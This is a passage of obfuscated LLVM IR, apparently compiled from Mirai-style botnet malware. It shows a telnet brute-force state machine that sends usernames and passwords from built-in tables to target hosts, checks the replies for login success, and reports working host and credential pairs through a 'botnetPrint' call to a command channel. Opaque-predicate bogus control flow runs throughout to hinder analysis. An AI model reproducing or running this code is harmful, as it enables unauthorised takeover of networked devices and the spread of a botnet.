  %426 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %425
  %427 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %426, i32 0, i32 0
  %428 = load i32, i32* %427, align 16
  %429 = sdiv i32 %428, 64
  %430 = sext i32 %429 to i64
  %431 = getelementptr inbounds [16 x i64], [16 x i64]* %423, i64 0, i64 %430
  %432 = load i64, i64* %431, align 8
  %433 = or i64 %432, %422
  store i64 %433, i64* %431, align 8
  %434 = getelementptr inbounds %struct.timeval, %struct.timeval* %21, i32 0, i32 0
  store i64 0, i64* %434, align 8
  %435 = load i32, i32* %11, align 4
  %436 = sext i32 %435 to i64
  %437 = getelementptr inbounds %struct.timeval, %struct.timeval* %21, i32 0, i32 1
  store i64 %436, i64* %437, align 8
  %438 = load i32, i32* %13, align 4
  %439 = sext i32 %438 to i64
  %440 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %439
  %441 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %440, i32 0, i32 0
  %442 = load i32, i32* %441, align 16
  %443 = add nsw i32 %442, 1
  %444 = call i32 @select(i32 %443, %struct.fd_set* null, %struct.fd_set* %20, %struct.fd_set* null, %struct.timeval* %21)
  store i32 %444, i32* %14, align 4
  %445 = load i32, i32* %14, align 4
  %446 = icmp eq i32 %445, 1
  br i1 %446, label %447, label %479

; <label>:447:                                    ; preds = %414
  store i32 4, i32* %22, align 4
  store i32 0, i32* %23, align 4
  %448 = load i32, i32* %13, align 4
  %449 = sext i32 %448 to i64
  %450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %449
  %451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %450, i32 0, i32 0
  %452 = load i32, i32* %451, align 16
  %453 = bitcast i32* %23 to i8*
  %454 = call i32 @getsockopt(i32 %452, i32 1, i32 4, i8* %453, i32* %22) #3
  %455 = load i32, i32* %23, align 4
  %456 = icmp ne i32 %455, 0
  br i1 %456, label %457, label %461

; <label>:457:                                    ; preds = %447
  %458 = load i32, i32* %13, align 4
  %459 = sext i32 %458 to i64
  %460 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %459
  call void @reset_telstate(%struct.telstate_t* %460)
  br label %478

; <label>:461:                                    ; preds = %447
  %462 = load i32, i32* %13, align 4
  %463 = sext i32 %462 to i64
  %464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %463
  %465 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %464, i32 0, i32 0
  %466 = load i32, i32* %465, align 16
  %467 = load i32, i32* %13, align 4
  %468 = sext i32 %467 to i64
  %469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %468
  %470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %469, i32 0, i32 0
  %471 = load i32, i32* %470, align 16
  %472 = call i32 (i32, i32, ...) @fcntl(i32 %471, i32 3, i8* null)
  %473 = and i32 %472, -2049
  %474 = call i32 (i32, i32, ...) @fcntl(i32 %466, i32 4, i32 %473)
  %475 = load i32, i32* %13, align 4
  %476 = sext i32 %475 to i64
  %477 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %476
  call void @advance_state(%struct.telstate_t* %477, i32 2)
  br label %478

; <label>:478:                                    ; preds = %461, %457
  br label %1108

; <label>:479:                                    ; preds = %414
  %480 = load i32, i32* %14, align 4
  %481 = icmp eq i32 %480, -1
  br i1 %481, label %482, label %486

; <label>:482:                                    ; preds = %479
  %483 = load i32, i32* %13, align 4
  %484 = sext i32 %483 to i64
  %485 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %484
  call void @reset_telstate(%struct.telstate_t* %485)
  br label %1108

; <label>:486:                                    ; preds = %479
  br label %487

; <label>:487:                                    ; preds = %486
  %488 = load i32, i32* %13, align 4
  %489 = sext i32 %488 to i64
  %490 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %489
  %491 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %490, i32 0, i32 7
  %492 = load i32, i32* %491, align 16
  %493 = add i32 %492, 5
  %494 = zext i32 %493 to i64
  %495 = call i64 @time(i64* null) #3
  %496 = icmp slt i64 %494, %495
  br i1 %496, label %497, label %501

; <label>:497:                                    ; preds = %487
  %498 = load i32, i32* %13, align 4
  %499 = sext i32 %498 to i64
  %500 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %499
  call void @reset_telstate(%struct.telstate_t* %500)
  br label %501

; <label>:501:                                    ; preds = %497, %487
  %502 = load i32, i32* @x.77
  %503 = load i32, i32* @y.78
  %504 = sub i32 %502, 1
  %505 = mul i32 %502, %504
  %506 = urem i32 %505, 2
  %507 = icmp eq i32 %506, 0
  %508 = icmp slt i32 %503, 10
  %509 = or i1 %507, %508
  br i1 %509, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %501
  %510 = load i32, i32* @x.77
  %511 = load i32, i32* @y.78
  %512 = sub i32 %510, 1
  %513 = mul i32 %510, %512
  %514 = urem i32 %513, 2
  %515 = icmp eq i32 %514, 0
  %516 = icmp slt i32 %511, 10
  %517 = or i1 %515, %516
  br i1 %517, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  br label %1107

; <label>:518:                                    ; preds = %178
  %519 = load i32, i32* %13, align 4
  %520 = sext i32 %519 to i64
  %521 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %520
  %522 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %521, i32 0, i32 0
  %523 = load i32, i32* %522, align 16
  %524 = load i32, i32* %11, align 4
  %525 = load i32, i32* %13, align 4
  %526 = sext i32 %525 to i64
  %527 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %526
  %528 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %527, i32 0, i32 9
  %529 = load i8*, i8** %528, align 8
  %530 = call i32 @read_until_response(i32 %523, i32 %524, i8* %529, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i32 0, i32 0))
  %531 = icmp ne i32 %530, 0
  br i1 %531, label %532, label %565

; <label>:532:                                    ; preds = %518
  %533 = load i32, i32* %13, align 4
  %534 = sext i32 %533 to i64
  %535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %534
  %536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %535, i32 0, i32 9
  %537 = load i8*, i8** %536, align 8
  %538 = call i32 @contains_fail(i8* %537)
  %539 = icmp ne i32 %538, 0
  br i1 %539, label %540, label %544

; <label>:540:                                    ; preds = %532
  %541 = load i32, i32* %13, align 4
  %542 = sext i32 %541 to i64
  %543 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %542
  call void @advance_state(%struct.telstate_t* %543, i32 0)
  br label %548

; <label>:544:                                    ; preds = %532
  %545 = load i32, i32* %13, align 4
  %546 = sext i32 %545 to i64
  %547 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %546
  call void @advance_state(%struct.telstate_t* %547, i32 3)
  br label %548

; <label>:548:                                    ; preds = %544, %540
  %549 = load i32, i32* @x.77
  %550 = load i32, i32* @y.78
  %551 = sub i32 %549, 1
  %552 = mul i32 %549, %551
  %553 = urem i32 %552, 2
  %554 = icmp eq i32 %553, 0
  %555 = icmp slt i32 %550, 10
  %556 = or i1 %554, %555
  br i1 %556, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %548
  %557 = load i32, i32* @x.77
  %558 = load i32, i32* @y.78
  %559 = sub i32 %557, 1
  %560 = mul i32 %557, %559
  %561 = urem i32 %560, 2
  %562 = icmp eq i32 %561, 0
  %563 = icmp slt i32 %558, 10
  %564 = or i1 %562, %563
  br i1 %564, label %originalBBpart255, label %originalBB53alteredBB

originalBBpart255:                                ; preds = %originalBB53
  br label %1108

; <label>:565:                                    ; preds = %518
  %566 = load i32, i32* @x.77
  %567 = load i32, i32* @y.78
  %568 = sub i32 %566, 1
  %569 = mul i32 %566, %568
  %570 = urem i32 %569, 2
  %571 = icmp eq i32 %570, 0
  %572 = icmp slt i32 %567, 10
  %573 = or i1 %571, %572
  br i1 %573, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %565
  %574 = load i32, i32* %13, align 4
  %575 = sext i32 %574 to i64
  %576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %575
  %577 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %576, i32 0, i32 7
  %578 = load i32, i32* %577, align 16
  %579 = add i32 %578, 7
  %580 = zext i32 %579 to i64
  %581 = call i64 @time(i64* null) #3
  %582 = icmp slt i64 %580, %581
  %583 = load i32, i32* @x.77
  %584 = load i32, i32* @y.78
  %585 = sub i32 %583, 1
  %586 = mul i32 %583, %585
  %587 = urem i32 %586, 2
  %588 = icmp eq i32 %587, 0
  %589 = icmp slt i32 %584, 10
  %590 = or i1 %588, %589
  br i1 %590, label %originalBBpart266, label %originalBB57alteredBB

originalBBpart266:                                ; preds = %originalBB57
  br i1 %582, label %591, label %595

; <label>:591:                                    ; preds = %originalBBpart266
  %592 = load i32, i32* %13, align 4
  %593 = sext i32 %592 to i64
  %594 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %593
  call void @reset_telstate(%struct.telstate_t* %594)
  br label %595

; <label>:595:                                    ; preds = %591, %originalBBpart266
  br label %1107

; <label>:596:                                    ; preds = %178
  %597 = load i32, i32* %13, align 4
  %598 = sext i32 %597 to i64
  %599 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %598
  %600 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %599, i32 0, i32 0
  %601 = load i32, i32* %600, align 16
  %602 = load i32, i32* %13, align 4
  %603 = sext i32 %602 to i64
  %604 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %603
  %605 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %604, i32 0, i32 4
  %606 = load i8, i8* %605, align 2
  %607 = zext i8 %606 to i64
  %608 = getelementptr inbounds [0 x i8*], [0 x i8*]* @usernames, i64 0, i64 %607
  %609 = load i8*, i8** %608, align 8
  %610 = load i32, i32* %13, align 4
  %611 = sext i32 %610 to i64
  %612 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %611
  %613 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %612, i32 0, i32 4
  %614 = load i8, i8* %613, align 2
  %615 = zext i8 %614 to i64
  %616 = getelementptr inbounds [0 x i8*], [0 x i8*]* @usernames, i64 0, i64 %615
  %617 = load i8*, i8** %616, align 8
  %618 = call i64 @strlen(i8* %617) #9
  %619 = call i64 @send(i32 %601, i8* %609, i64 %618, i32 16384)
  %620 = icmp slt i64 %619, 0
  br i1 %620, label %621, label %625

; <label>:621:                                    ; preds = %596
  %622 = load i32, i32* %13, align 4
  %623 = sext i32 %622 to i64
  %624 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %623
  call void @reset_telstate(%struct.telstate_t* %624)
  br label %1108

; <label>:625:                                    ; preds = %596
  %626 = load i32, i32* %13, align 4
  %627 = sext i32 %626 to i64
  %628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %627
  %629 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %628, i32 0, i32 0
  %630 = load i32, i32* %629, align 16
  %631 = call i64 @send(i32 %630, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.93, i32 0, i32 0), i64 2, i32 16384)
  %632 = icmp slt i64 %631, 0
  br i1 %632, label %633, label %637

; <label>:633:                                    ; preds = %625
  %634 = load i32, i32* %13, align 4
  %635 = sext i32 %634 to i64
  %636 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %635
  call void @reset_telstate(%struct.telstate_t* %636)
  br label %1108

; <label>:637:                                    ; preds = %625
  %638 = load i32, i32* %13, align 4
  %639 = sext i32 %638 to i64
  %640 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %639
  call void @advance_state(%struct.telstate_t* %640, i32 4)
  br label %1107

; <label>:641:                                    ; preds = %178
  %642 = load i32, i32* %13, align 4
  %643 = sext i32 %642 to i64
  %644 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %643
  %645 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %644, i32 0, i32 0
  %646 = load i32, i32* %645, align 16
  %647 = load i32, i32* %11, align 4
  %648 = load i32, i32* %13, align 4
  %649 = sext i32 %648 to i64
  %650 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %649
  %651 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %650, i32 0, i32 9
  %652 = load i8*, i8** %651, align 8
  %653 = call i32 @read_until_response(i32 %646, i32 %647, i8* %652, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i32 0, i32 0))
  %654 = icmp ne i32 %653, 0
  br i1 %654, label %655, label %704

; <label>:655:                                    ; preds = %641
  %656 = load i32, i32* @x.77
  %657 = load i32, i32* @y.78
  %658 = sub i32 %656, 1
  %659 = mul i32 %656, %658
  %660 = urem i32 %659, 2
  %661 = icmp eq i32 %660, 0
  %662 = icmp slt i32 %657, 10
  %663 = or i1 %661, %662
  br i1 %663, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %655
  %664 = load i32, i32* %13, align 4
  %665 = sext i32 %664 to i64
  %666 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %665
  %667 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %666, i32 0, i32 9
  %668 = load i8*, i8** %667, align 8
  %669 = call i32 @contains_fail(i8* %668)
  %670 = icmp ne i32 %669, 0
  %671 = load i32, i32* @x.77
  %672 = load i32, i32* @y.78
  %673 = sub i32 %671, 1
  %674 = mul i32 %671, %673
  %675 = urem i32 %674, 2
  %676 = icmp eq i32 %675, 0
  %677 = icmp slt i32 %672, 10
  %678 = or i1 %676, %677
  br i1 %678, label %originalBBpart270, label %originalBB68alteredBB

originalBBpart270:                                ; preds = %originalBB68
  br i1 %670, label %679, label %699

; <label>:679:                                    ; preds = %originalBBpart270
  %680 = load i32, i32* @x.77
  %681 = load i32, i32* @y.78
  %682 = sub i32 %680, 1
  %683 = mul i32 %680, %682
  %684 = urem i32 %683, 2
  %685 = icmp eq i32 %684, 0
  %686 = icmp slt i32 %681, 10
  %687 = or i1 %685, %686
  br i1 %687, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %679
  %688 = load i32, i32* %13, align 4
  %689 = sext i32 %688 to i64
  %690 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %689
  call void @advance_state(%struct.telstate_t* %690, i32 0)
  %691 = load i32, i32* @x.77
  %692 = load i32, i32* @y.78
  %693 = sub i32 %691, 1
  %694 = mul i32 %691, %693
  %695 = urem i32 %694, 2
  %696 = icmp eq i32 %695, 0
  %697 = icmp slt i32 %692, 10
  %698 = or i1 %696, %697
  br i1 %698, label %originalBBpart274, label %originalBB72alteredBB

originalBBpart274:                                ; preds = %originalBB72
  br label %703

; <label>:699:                                    ; preds = %originalBBpart270
  %700 = load i32, i32* %13, align 4
  %701 = sext i32 %700 to i64
  %702 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %701
  call void @advance_state(%struct.telstate_t* %702, i32 5)
  br label %703

; <label>:703:                                    ; preds = %699, %originalBBpart274
  br label %1108

; <label>:704:                                    ; preds = %641
  %705 = load i32, i32* @x.77
  %706 = load i32, i32* @y.78
  %707 = sub i32 %705, 1
  %708 = mul i32 %705, %707
  %709 = urem i32 %708, 2
  %710 = icmp eq i32 %709, 0
  %711 = icmp slt i32 %706, 10
  %712 = or i1 %710, %711
  br i1 %712, label %originalBB76, label %originalBB76alteredBB

originalBB76:                                     ; preds = %originalBB76alteredBB, %704
  %713 = load i32, i32* %13, align 4
  %714 = sext i32 %713 to i64
  %715 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %714
  %716 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %715, i32 0, i32 7
  %717 = load i32, i32* %716, align 16
  %718 = add i32 %717, 3
  %719 = zext i32 %718 to i64
  %720 = call i64 @time(i64* null) #3
  %721 = icmp slt i64 %719, %720
  %722 = load i32, i32* @x.77
  %723 = load i32, i32* @y.78
  %724 = sub i32 %722, 1
  %725 = mul i32 %722, %724
  %726 = urem i32 %725, 2
  %727 = icmp eq i32 %726, 0
  %728 = icmp slt i32 %723, 10
  %729 = or i1 %727, %728
  br i1 %729, label %originalBBpart281, label %originalBB76alteredBB

originalBBpart281:                                ; preds = %originalBB76
  br i1 %721, label %730, label %750

; <label>:730:                                    ; preds = %originalBBpart281
  %731 = load i32, i32* @x.77
  %732 = load i32, i32* @y.78
  %733 = sub i32 %731, 1
  %734 = mul i32 %731, %733
  %735 = urem i32 %734, 2
  %736 = icmp eq i32 %735, 0
  %737 = icmp slt i32 %732, 10
  %738 = or i1 %736, %737
  br i1 %738, label %originalBB83, label %originalBB83alteredBB

originalBB83:                                     ; preds = %originalBB83alteredBB, %730
  %739 = load i32, i32* %13, align 4
  %740 = sext i32 %739 to i64
  %741 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %740
  call void @reset_telstate(%struct.telstate_t* %741)
  %742 = load i32, i32* @x.77
  %743 = load i32, i32* @y.78
  %744 = sub i32 %742, 1
  %745 = mul i32 %742, %744
  %746 = urem i32 %745, 2
  %747 = icmp eq i32 %746, 0
  %748 = icmp slt i32 %743, 10
  %749 = or i1 %747, %748
  br i1 %749, label %originalBBpart285, label %originalBB83alteredBB

originalBBpart285:                                ; preds = %originalBB83
  br label %750

; <label>:750:                                    ; preds = %originalBBpart285, %originalBBpart281
  br label %1107

; <label>:751:                                    ; preds = %178
  %752 = load i32, i32* %13, align 4
  %753 = sext i32 %752 to i64
  %754 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %753
  %755 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %754, i32 0, i32 0
  %756 = load i32, i32* %755, align 16
  %757 = load i32, i32* %13, align 4
  %758 = sext i32 %757 to i64
  %759 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %758
  %760 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %759, i32 0, i32 5
  %761 = load i8, i8* %760, align 1
  %762 = zext i8 %761 to i64
  %763 = getelementptr inbounds i32, i32* %50, i64 %762
  %764 = load i32, i32* %763, align 4
  %765 = sext i32 %764 to i64
  %766 = inttoptr i64 %765 to i8*
  %767 = load i32, i32* %13, align 4
  %768 = sext i32 %767 to i64
  %769 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %768
  %770 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %769, i32 0, i32 5
  %771 = load i8, i8* %770, align 1
  %772 = zext i8 %771 to i64
  %773 = getelementptr inbounds i32, i32* %50, i64 %772
  %774 = load i32, i32* %773, align 4
  %775 = sext i32 %774 to i64
  %776 = inttoptr i64 %775 to i8*
  %777 = call i64 @strlen(i8* %776) #9
  %778 = call i64 @send(i32 %756, i8* %766, i64 %777, i32 16384)
  %779 = icmp slt i64 %778, 0
  br i1 %779, label %780, label %784

; <label>:780:                                    ; preds = %751
  %781 = load i32, i32* %13, align 4
  %782 = sext i32 %781 to i64
  %783 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %782
  call void @reset_telstate(%struct.telstate_t* %783)
  br label %1108

; <label>:784:                                    ; preds = %751
  %785 = load i32, i32* %13, align 4
  %786 = sext i32 %785 to i64
  %787 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %786
  %788 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %787, i32 0, i32 0
  %789 = load i32, i32* %788, align 16
  %790 = call i64 @send(i32 %789, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.93, i32 0, i32 0), i64 2, i32 16384)
  %791 = icmp slt i64 %790, 0
  br i1 %791, label %792, label %796

; <label>:792:                                    ; preds = %784
  %793 = load i32, i32* %13, align 4
  %794 = sext i32 %793 to i64
  %795 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %794
  call void @reset_telstate(%struct.telstate_t* %795)
  br label %1108

; <label>:796:                                    ; preds = %784
  %797 = load i32, i32* %13, align 4
  %798 = sext i32 %797 to i64
  %799 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %798
  call void @advance_state(%struct.telstate_t* %799, i32 6)
  br label %1107

; <label>:800:                                    ; preds = %178
  %801 = load i32, i32* %13, align 4
  %802 = sext i32 %801 to i64
  %803 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %802
  %804 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %803, i32 0, i32 0
  %805 = load i32, i32* %804, align 16
  %806 = load i32, i32* %11, align 4
  %807 = load i32, i32* %13, align 4
  %808 = sext i32 %807 to i64
  %809 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %808
  %810 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %809, i32 0, i32 9
  %811 = load i8*, i8** %810, align 8
  %812 = call i32 @read_until_response(i32 %805, i32 %806, i8* %811, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %813 = icmp ne i32 %812, 0
  br i1 %813, label %814, label %917

; <label>:814:                                    ; preds = %800
  %815 = call i64 @time(i64* null) #3
  %816 = trunc i64 %815 to i32
  %817 = load i32, i32* %13, align 4
  %818 = sext i32 %817 to i64
  %819 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %818
  %820 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %819, i32 0, i32 7
  store i32 %816, i32* %820, align 16
  %821 = load i32, i32* %13, align 4
  %822 = sext i32 %821 to i64
  %823 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %822
  %824 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %823, i32 0, i32 9
  %825 = load i8*, i8** %824, align 8
  %826 = call i32 @contains_fail(i8* %825)
  %827 = icmp ne i32 %826, 0
  br i1 %827, label %828, label %832

; <label>:828:                                    ; preds = %814
  %829 = load i32, i32* %13, align 4
  %830 = sext i32 %829 to i64
  %831 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %830
  call void @advance_state(%struct.telstate_t* %831, i32 0)
  br label %916

; <label>:832:                                    ; preds = %814
  %833 = load i32, i32* %13, align 4
  %834 = sext i32 %833 to i64
  %835 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %834
  %836 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %835, i32 0, i32 9
  %837 = load i8*, i8** %836, align 8
  %838 = call i32 @contains_success(i8* %837)
  %839 = icmp ne i32 %838, 0
  br i1 %839, label %840, label %895

; <label>:840:                                    ; preds = %832
  %841 = load i32, i32* %13, align 4
  %842 = sext i32 %841 to i64
  %843 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %842
  %844 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %843, i32 0, i32 3
  %845 = load i8, i8* %844, align 1
  %846 = zext i8 %845 to i32
  %847 = icmp eq i32 %846, 2
  br i1 %847, label %848, label %868

; <label>:848:                                    ; preds = %840
  %849 = load i32, i32* @x.77
  %850 = load i32, i32* @y.78
  %851 = sub i32 %849, 1
  %852 = mul i32 %849, %851
  %853 = urem i32 %852, 2
  %854 = icmp eq i32 %853, 0
  %855 = icmp slt i32 %850, 10
  %856 = or i1 %854, %855
  br i1 %856, label %originalBB87, label %originalBB87alteredBB

originalBB87:                                     ; preds = %originalBB87alteredBB, %848
  %857 = load i32, i32* %13, align 4
  %858 = sext i32 %857 to i64
  %859 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %858
  call void @advance_state(%struct.telstate_t* %859, i32 7)
  %860 = load i32, i32* @x.77
  %861 = load i32, i32* @y.78
  %862 = sub i32 %860, 1
  %863 = mul i32 %860, %862
  %864 = urem i32 %863, 2
  %865 = icmp eq i32 %864, 0
  %866 = icmp slt i32 %861, 10
  %867 = or i1 %865, %866
  br i1 %867, label %originalBBpart289, label %originalBB87alteredBB

originalBBpart289:                                ; preds = %originalBB87
  br label %894

; <label>:868:                                    ; preds = %840
  %869 = load i32, i32* @switchCommStock, align 4
  %870 = load i32, i32* %13, align 4
  %871 = sext i32 %870 to i64
  %872 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %871
  %873 = call i8* @get_telstate_host(%struct.telstate_t* %872)
  %874 = load i32, i32* %13, align 4
  %875 = sext i32 %874 to i64
  %876 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %875
  %877 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %876, i32 0, i32 4
  %878 = load i8, i8* %877, align 2
  %879 = zext i8 %878 to i64
  %880 = getelementptr inbounds [0 x i8*], [0 x i8*]* @usernames, i64 0, i64 %879
  %881 = load i8*, i8** %880, align 8
  %882 = load i32, i32* %13, align 4
  %883 = sext i32 %882 to i64
  %884 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %883
  %885 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %884, i32 0, i32 5
  %886 = load i8, i8* %885, align 1
  %887 = zext i8 %886 to i64
  %888 = getelementptr inbounds i32, i32* %50, i64 %887
  %889 = load i32, i32* %888, align 4
  %890 = call i32 (i32, i8*, ...) @botnetPrint(i32 %869, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.94, i32 0, i32 0), i8* %873, i8* %881, i32 %889)
  %891 = load i32, i32* %13, align 4
  %892 = sext i32 %891 to i64
  %893 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %892
  call void @advance_state(%struct.telstate_t* %893, i32 7)
  br label %894

; <label>:894:                                    ; preds = %868, %originalBBpart289
  br label %899

; <label>:895:                                    ; preds = %832
  %896 = load i32, i32* %13, align 4
  %897 = sext i32 %896 to i64
  %898 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %897
  call void @reset_telstate(%struct.telstate_t* %898)
  br label %899

; <label>:899:                                    ; preds = %895, %894
  %900 = load i32, i32* @x.77
  %901 = load i32, i32* @y.78
  %902 = sub i32 %900, 1
  %903 = mul i32 %900, %902
  %904 = urem i32 %903, 2
  %905 = icmp eq i32 %904, 0
  %906 = icmp slt i32 %901, 10
  %907 = or i1 %905, %906
  br i1 %907, label %originalBB91, label %originalBB91alteredBB

originalBB91:                                     ; preds = %originalBB91alteredBB, %899
  %908 = load i32, i32* @x.77
  %909 = load i32, i32* @y.78
  %910 = sub i32 %908, 1
  %911 = mul i32 %908, %910
  %912 = urem i32 %911, 2
  %913 = icmp eq i32 %912, 0
  %914 = icmp slt i32 %909, 10
  %915 = or i1 %913, %914
  br i1 %915, label %originalBBpart293, label %originalBB91alteredBB

originalBBpart293:                                ; preds = %originalBB91
  br label %916

; <label>:916:                                    ; preds = %originalBBpart293, %828
  br label %1108

; <label>:917:                                    ; preds = %800
  %918 = load i32, i32* @x.77
  %919 = load i32, i32* @y.78
  %920 = sub i32 %918, 1
  %921 = mul i32 %918, %920
  %922 = urem i32 %921, 2
  %923 = icmp eq i32 %922, 0
  %924 = icmp slt i32 %919, 10
  %925 = or i1 %923, %924
  br i1 %925, label %originalBB95, label %originalBB95alteredBB

originalBB95:                                     ; preds = %originalBB95alteredBB, %917
  %926 = load i32, i32* %13, align 4
  %927 = sext i32 %926 to i64
  %928 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %927
  %929 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %928, i32 0, i32 7
  %930 = load i32, i32* %929, align 16
  %931 = add i32 %930, 7
  %932 = zext i32 %931 to i64
  %933 = call i64 @time(i64* null) #3
  %934 = icmp slt i64 %932, %933
  %935 = load i32, i32* @x.77
  %936 = load i32, i32* @y.78
  %937 = sub i32 %935, 1
  %938 = mul i32 %935, %937
  %939 = urem i32 %938, 2
  %940 = icmp eq i32 %939, 0
  %941 = icmp slt i32 %936, 10
  %942 = or i1 %940, %941
  br i1 %942, label %originalBBpart298, label %originalBB95alteredBB

originalBBpart298:                                ; preds = %originalBB95
  br i1 %934, label %943, label %947

; <label>:943:                                    ; preds = %originalBBpart298
  %944 = load i32, i32* %13, align 4
  %945 = sext i32 %944 to i64
  %946 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %945
  call void @reset_telstate(%struct.telstate_t* %946)
  br label %947

; <label>:947:                                    ; preds = %943, %originalBBpart298
  %948 = load i32, i32* @x.77
  %949 = load i32, i32* @y.78
  %950 = sub i32 %948, 1
  %951 = mul i32 %948, %950
  %952 = urem i32 %951, 2
  %953 = icmp eq i32 %952, 0
  %954 = icmp slt i32 %949, 10
  %955 = or i1 %953, %954
  br i1 %955, label %originalBB100, label %originalBB100alteredBB

originalBB100:                                    ; preds = %originalBB100alteredBB, %947
  %956 = load i32, i32* @x.77
  %957 = load i32, i32* @y.78
  %958 = sub i32 %956, 1
  %959 = mul i32 %956, %958
  %960 = urem i32 %959, 2
  %961 = icmp eq i32 %960, 0
